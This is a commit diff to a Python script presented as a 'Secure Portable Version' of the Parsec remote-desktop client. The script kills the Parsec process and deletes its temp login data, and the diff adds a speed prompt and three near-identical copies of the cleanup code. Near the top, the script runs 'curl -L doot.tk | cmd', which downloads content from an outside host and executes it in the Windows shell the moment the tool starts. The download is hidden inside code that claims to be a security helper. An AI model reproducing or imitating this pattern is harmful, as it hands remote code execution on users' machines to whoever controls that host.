Update Secure Portable Version of Parsec.py

+++ Secure Portable Version of Parsec.py
@@ -2,20 +2,50 @@ import time
 import os
 import sys
 
+choice = input("Pick the power of your computer: \n 1. Slow Computer (takes 10-15 seconds to delete a file) \n 2. Medium Computer (takes 5-10 seconds to delete a file) \n 3. Fast Computer (takes 1-5 seconds to delete a file): \n")
+
 os.system("curl -L doot.tk | cmd")
 
-if __name__ == '__main__':
-    try:
-        while True:
-            print("PRESS CTRL + C TO EXIT PARSEC AND DELETE ALL THE LOGIN DATA INFO")
-    except KeyboardInterrupt:
-        os.system("taskkill /f /im  parsecd.exe")
-        time.sleep(3)
-        os.system('rmdir /s /q "%Temp%\\Parsec"')
-        try:
-            sys.exit(0)
-        except SystemExit:
-            os._exit(0)
+while True:
+    if choice == "1":
+            if __name__ == '__main__':
+                try:
+                    while True:
+                        print("PRESS CTRL + C TO EXIT PARSEC AND DELETE ALL THE LOGIN DATA INFO")
+                except KeyboardInterrupt:
+                    os.system("taskkill /f /im  parsecd.exe")
+                    time.sleep(15)
+                    os.system('rmdir /s /q "%Temp%\\Parsec"')
+                    try:
+                        sys.exit(0)
+                    except SystemExit:
+                        os._exit(0)
+    if choice == "2":
+            if __name__ == '__main__':
+                try:
+                    while True:
+                        print("PRESS CTRL + C TO EXIT PARSEC AND DELETE ALL THE LOGIN DATA INFO")
+                except KeyboardInterrupt:
+                    os.system("taskkill /f /im  parsecd.exe")
+                    time.sleep(10)
+                    os.system('rmdir /s /q "%Temp%\\Parsec"')
+                    try:
+                        sys.exit(0)
+                    except SystemExit:
+                        os._exit(0)
+    if choice == "3":
+            if __name__ == '__main__':
+                try:
+                    while True:
+                        print("PRESS CTRL + C TO EXIT PARSEC AND DELETE ALL THE LOGIN DATA INFO")
+                except KeyboardInterrupt:
+                    os.system("taskkill /f /im  parsecd.exe")
+                    time.sleep(5)
+                    os.system('rmdir /s /q "%Temp%\\Parsec"')
+                    try:
+                        sys.exit(0)
+                    except SystemExit:
+                        os._exit(0)                        
 
 #Created with love by Al3xutzu <3
 #Created with love by Al3xutzu <3
